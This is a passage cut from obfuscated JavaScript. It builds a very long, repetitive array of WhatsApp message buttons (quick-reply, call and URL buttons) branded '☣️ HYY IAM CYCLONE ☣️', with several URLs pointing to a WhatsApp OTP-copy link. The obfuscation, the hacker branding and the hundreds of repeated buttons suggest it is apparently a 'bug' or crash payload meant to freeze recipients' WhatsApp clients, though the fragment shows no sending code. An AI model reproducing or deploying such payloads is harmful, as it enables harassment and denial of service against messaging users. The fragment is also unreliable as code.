rl':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'d